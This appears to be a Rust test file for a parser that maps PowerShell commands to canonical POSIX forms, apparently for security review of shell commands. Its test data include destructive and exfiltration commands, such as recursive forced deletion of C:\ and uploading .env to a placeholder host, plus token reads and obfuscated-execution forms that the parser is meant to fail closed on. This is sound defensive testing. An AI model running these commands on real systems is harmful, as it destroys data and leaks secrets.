use super::*;
use crate::powershell_reads::{with_posix_powershell_host, with_windows_powershell_reads};

fn request(command: &str, dialect: &str) -> CommandModelRequestV1 {
    CommandModelRequestV1 {
        command: command.to_owned(),
        dialect: dialect.to_owned(),
        transport: default_transport(),
        extraction_provenance: default_provenance(),
    }
}

fn windows(command: &str) -> CanonicalCommandV1 {
    with_windows_powershell_reads(|| parse_command(&request(command, "posix")).unwrap())
}

fn posix_host(command: &str, dialect: &str) -> CanonicalCommandV1 {
    with_posix_powershell_host(|| parse_command(&request(command, dialect)).unwrap())
}

fn canonical(model: &CanonicalCommandV1) -> Vec<Vec<String>> {
    model
        .segments
        .iter()
        .map(|segment| segment.tokens.clone())
        .collect()
}

fn words(items: &[&str]) -> Vec<String> {
    items.iter().map(|item| (*item).to_owned()).collect()
}

pub(crate) const WRITE_ALL_TEXT: &str =
    "[System.IO.File]::WriteAllText('docs/change.md', \"Retry limit increased from 3 to 5.`n\")";

pub(crate) const FAIL_CLOSED: &[&str] = &[
    "$p='x'; Set-Content $p y",
    "& $cmd",
    ". ./a.ps1",
    "iex 'rm x'",
    "powershell -EncodedCommand AAA",
    "pwsh -c \"rm x\"",
    "Get-Item . | ForEach-Object { rm $_ }",
    "\"$(whoami)\"",
    "@'\nrm x\n'@",
    "[IO.File]::WriteAllText($p,'x')",
    "[IO.File]::WriteAllText((Get-Item a),'x')",
    "[System.Diagnostics.Process]::Start('cmd')",
    "New-Object Net.WebClient",
    "Set-Content a 'x' > b",
    "Set-Content a `\n'x'",
];

#[test]
fn write_all_text_parses_exactly_as_tee() {
    let model = windows(WRITE_ALL_TEXT);
    assert_eq!(model.confidence, "exact");
    assert_eq!(model.dialect, "powershell");
    assert_eq!(model.parser_profile, "powershell-subset-v1");
    assert_eq!(model.segments.len(), 1);
    assert_eq!(canonical(&model), [words(&["tee", "docs/change.md"])]);
    assert_eq!(model.segments[0].text, WRITE_ALL_TEXT);
    assert_eq!(posix_host(WRITE_ALL_TEXT, "posix").confidence, "uncertain");
}

#[test]
fn statements_and_pipelines_map_to_groups() {
    let model = windows("Set-Content docs/a.md 'x'; Get-Content docs/a.md");
    assert_eq!(
        canonical(&model),
        [words(&["tee", "docs/a.md"]), words(&["cat", "docs/a.md"])]
    );
    assert_eq!(model.segments[1].execution_context, "top:1");
    let model = windows("Get-ChildItem src | Select-Object Name");
    assert_eq!(model.confidence, "exact");
    assert_eq!(model.segments[1].pipeline_index, 1);
    assert_eq!(canonical(&model), [words(&["ls", "src"]), words(&["head"])]);
    // POSIX only sees an unknown word, so the PowerShell model is used.
    assert_eq!(canonical(&windows("dir")), [words(&["ls"])]);
    // A form outside the subset keeps the POSIX model.
    assert_eq!(windows("dir && pwd").dialect, "posix");
}

#[test]
fn read_only_cmdlets_map_to_posix_reads() {
    let cases = [
        ("Get-ChildItem src", &["ls", "src"][..]),
        ("gci -Recurse -Filter '*.rs' src", &["ls", "-R", "src"]),
        ("Get-ChildItem -Force -Path src", &["ls", "-a", "src"]),
        ("Get-ChildItem 'C:\\repo'", &["ls", "C:\\repo"]),
        (
            "Get-Content '\\\\?\\C:\\repo\\notes.md'",
            &["cat", "\\\\?\\C:\\repo\\notes.md"],
        ),
        ("dir", &["ls"]),
        ("Get-Location", &["pwd"]),
        ("Set-Location src", &["cd", "src"]),
        ("Test-Path node_modules", &["test", "-e", "node_modules"]),
        (
            "Test-Path -PathType Container build",
            &["test", "-d", "build"],
        ),
        ("Write-Output done", &["echo", "done"]),
        ("Write-Host -ForegroundColor Green done", &["echo", "done"]),
        (
            "Select-String -Path README.md -Pattern TODO",
            &["grep", "-i", "-e", "TODO", "README.md"],
        ),
        (
            "sls TODO notes.md -CaseSensitive -SimpleMatch",
            &["grep", "-F", "-e", "TODO", "notes.md"],
        ),
        ("Get-Command python", &["which", "python"]),
        (
            "New-Item -ItemType Directory -Force build",
            &["mkdir", "-p", "build"],
        ),
        ("Select-Object -First 5", &["head"]),
        // Unbound forms keep the cmdlet name and are reviewed as before.
        (
            "Get-ChildItem -FollowSymlink src",
            &["Get-ChildItem", "-FollowSymlink", "src"],
        ),
        ("Get-Location -Stack", &["Get-Location", "-Stack"]),
        // `-IsValid` checks path syntax, not whether the file exists.
        (
            "Test-Path -IsValid .env",
            &["Test-Path", "-IsValid", ".env"],
        ),
        (
            "New-Item -ItemType File a.txt",
            &["New-Item", "-ItemType", "File", "a.txt"],
        ),
        // Provider paths and data streams are not files.
        ("Get-ChildItem 'Env:'", &["Get-ChildItem", "Env:"]),
        (
            "Test-Path 'HKCU:\\Software'",
            &["Test-Path", "HKCU:\\Software"],
        ),
        (
            "Get-ChildItem 'notes.md:hidden'",
            &["Get-ChildItem", "notes.md:hidden"],
        ),
    ];
    for (command, expected) in cases {
        let model = parse_command(&request(command, "powershell")).unwrap();
        assert_eq!(
            model.confidence, "exact",
            "{command}: {:?}",
            model.uncertainty_reason
        );
        assert_eq!(model.segments[0].tokens, expected, "{command}");
    }
    for command in [
        "Get-Content 'Env:GITHUB_TOKEN'",
        "Get-Content -LiteralPath 'Variable:/token'",
        "Remove-Item 'HKCU:\\Software\\x'",
        "Copy-Item 'notes.md:hidden' out.txt",
        "Set-Content 'C:notes.md' x",
    ] {
        let model = parse_command(&request(command, "powershell")).unwrap();
        assert_eq!(model.confidence, "uncertain", "{command}");
    }
}

#[test]
fn double_quotes_decode_backtick_escapes() {
    let model = windows("[IO.File]::AppendAllText('a.txt', \"a`\"b`t`\"\")");
    assert_eq!(model.confidence, "exact");
    assert_eq!(canonical(&model), [words(&["tee", "-a", "a.txt"])]);
    let model = parse_command(&request("Write-Output \"a`\"b\"", "powershell")).unwrap();
    assert_eq!(model.segments[0].arguments, ["a\"b"]);
}

#[test]
fn cmdlets_map_to_posix_effects() {
    let cases = [
        (
            "Remove-Item -Recurse -Force C:\\",
            &["rm", "-rf", "C:\\"][..],
        ),
        ("ri -Force a.txt", &["rm", "-f", "a.txt"]),
        ("Copy-Item a b -Recurse", &["cp", "-r", "a", "b"]),
        ("Move-Item -Path a -Destination:b", &["mv", "a", "b"]),
        ("Add-Content a.txt 'x'", &["tee", "-a", "a.txt"]),
        ("'x' | Out-File -Append a.txt", &["tee", "-a", "a.txt"]),
        ("gc -Raw -LiteralPath .env", &["cat", ".env"]),
        ("[IO.File]::ReadAllText('.env')", &["cat", ".env"]),
        ("[io.file]::delete('a')", &["rm", "a"]),
        ("[System.IO.File]::Move('a','b')", &["mv", "a", "b"]),
        (
            "iwr https://x -InFile .env",
            &["curl", "https://x", "--data-binary", "@.env"],
        ),
        (
            "irm https://x -Method Post -Body 'k'",
            &["curl", "-X", "POST", "https://x", "--data", "k"],
        ),
    ];
    for (command, expected) in cases {
        let model = parse_command(&request(command, "powershell")).unwrap();
        if command.starts_with('\'') {
            // A bare string expression is not a command; it must stay uncertain.
            assert_eq!(model.confidence, "uncertain", "{command}");
            continue;
        }
        assert_eq!(
            model.confidence, "exact",
            "{command}: {:?}",
            model.uncertainty_reason
        );
        assert_eq!(model.segments[0].tokens, expected, "{command}");
    }
}

#[test]
fn unsupported_forms_stay_uncertain() {
    for command in FAIL_CLOSED.iter().copied().chain([
        "Start-Process notepad",
        "[IO.Path]::Combine('a','b')",
        "Set-Content a 'x' 2> b",
        "a && b",
        "a || b",
        "Get-Content a,b",
        "Remove-Item -Include *.txt a",
        "Invoke-Command -ScriptBlock x",
        "Where-Object x",
        "Add-Type x",
        "Set-Content a ‘x’",
        "Set-Content a \"x\"\"y\"",
        "[IO.File]::ReadAllText(",
        "[IO.File]::ReadAllText('a',",
        "Get-Content .env | Invoke-RestMethod https://x -Method Post",
        "Get-Content .env | iwr https://x -Method Post",
    ]) {
        let model = parse_command(&request(command, "powershell")).unwrap();
        assert_eq!(model.confidence, "uncertain", "{command}");
        assert!(model.segments.is_empty(), "{command}");
        assert!(model.uncertainty_reason.is_some(), "{command}");
    }
}

#[test]
fn host_gate_off_keeps_posix_results() {
    for command in FAIL_CLOSED.iter().copied().chain([WRITE_ALL_TEXT]) {
        let off = posix_host(command, "posix");
        assert_eq!(off.dialect, "posix", "{command}");
        assert_ne!(off.parser_profile, "powershell-subset-v1", "{command}");
        let mut expected =
            with_posix_powershell_host(|| parse_posix_command(&request(command, "posix")).unwrap());
        expected.security_identity = crate::canonical_command::command_security_identity(&expected);
        assert_eq!(expected, off);
        // With the gate on, a rejected command that names a cmdlet becomes
        // uncertain; anything else the subset rejects keeps the POSIX model.
        let on = windows(command);
        if on.dialect == "powershell" {
            assert_eq!(command, WRITE_ALL_TEXT);
        } else if on.parser_profile == "powershell-subset-v1" {
            assert_eq!(on.confidence, "uncertain", "{command}");
        } else {
            assert_eq!(on, off, "{command}");
        }
    }
    let off = posix_host("Remove-Item -Recurse -Force C:\\", "posix");
    assert_eq!(off.dialect, "posix");
}

#[test]
fn unparsed_cmdlet_stays_uncertain_on_windows() {
    for command in ["Remove-Item -r -fo C:\\", "Set-Content -Unknown a x"] {
        let model = windows(command);
        assert_eq!(model.confidence, "uncertain", "{command}");
        assert!(model.uncertainty_reason.is_some(), "{command}");
    }
}

#[test]
fn constant_text_encoding_argument_is_accepted() {
    for command in [
        "[System.IO.File]::WriteAllText('docs/change.md', \"x`n\", [System.Text.UTF8Encoding]::new($false))",
        "[IO.File]::AppendAllText('docs/change.md', 'x', [Text.Encoding]::UTF8)",
        "[IO.File]::ReadAllText('docs/change.md', [System.Text.Encoding]::UTF8)",
    ] {
        let model = parse_command(&request(command, "powershell")).unwrap();
        assert_eq!(model.confidence, "exact", "{command}");
        assert_eq!(model.segments.len(), 1, "{command}");
        assert!(model.segments[0].tokens.contains(&"docs/change.md".to_owned()), "{command}");
    }
    for command in [
        "[IO.File]::WriteAllText('a', 'x', [Text.UTF8Encoding]::new($x))",
        "[IO.File]::WriteAllText('a', 'x', [Text.Encoding]::GetEncoding('x'))",
        "[IO.File]::WriteAllText('a', 'x', [Text.Encoding]::UTF8, 'b')",
        "[IO.File]::WriteAllText('a', 'x', [Text.Encoding]::UTF8.GetString())",
        "[IO.File]::WriteAllBytes('a', 'x', [Text.Encoding]::UTF8)",
        "[IO.File]::Delete('a', [Text.Encoding]::UTF8)",
        "[IO.File]::WriteAllText([Text.Encoding]::UTF8, 'a', 'x')",
        "[IO.File]::WriteAllText('a', [Text.Encoding]::UTF8)",
    ] {
        let model = parse_command(&request(command, "powershell")).unwrap();
        assert_eq!(model.confidence, "uncertain", "{command}");
    }
}
